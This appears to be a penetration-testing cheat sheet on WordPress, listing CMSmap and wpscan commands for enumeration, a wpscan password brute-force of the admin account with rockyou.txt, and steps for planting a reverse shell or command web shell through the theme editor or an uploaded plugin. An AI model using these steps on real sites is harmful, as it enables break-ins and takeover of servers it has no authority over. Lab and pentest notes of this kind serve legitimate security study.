---
description: Wordpress enumeration tools.
---

# Wordpress

CMSMAP - [https://github.com/Dionach/CMSmap](https://github.com/Dionach/CMSmap)

wpscan - [https://github.com/wpscanteam/wpscan](https://github.com/wpscanteam/wpscan)P

I installed CMSMAP at /opt/cmsmap directory.

```
cd /opt/cmsmap
$ python3 cmsmap.py http://192.168.1.2
```

```
$ wpscan --url http://192.168.1.2/ --api-token {APITOKEN}

$ wpscan --url http://192.168.1.2/ --passwords ~/rockyou.txt --usernames admin

$ wpscan --update --url http://192.168.1.2/ --enumerate ap --plugins-detection aggressive
```

### Getting reverse shell

When we have access to the admin panel, we can get reverse shell or cmd shell via editing php file or installing plugin.

#### Editing file

Appearance -> Editor -> 404.php -> (PentestMonkey or IvanSincek) PHP Reverse Shell or Php CMD Shell

Sometimes, we can not change page contents. We can get it with plugins.

#### Installing Plugin-Shell

We can use plugin-shell.php or Php reverse shell files.

```
$ cp /usr/share/seclists/Web-Shells/WordPress/plugin-shell.php .
$ sudo zip plugin-shell.zip plugin-shell.php
```

[http://target/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=whoami](http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=whoami)
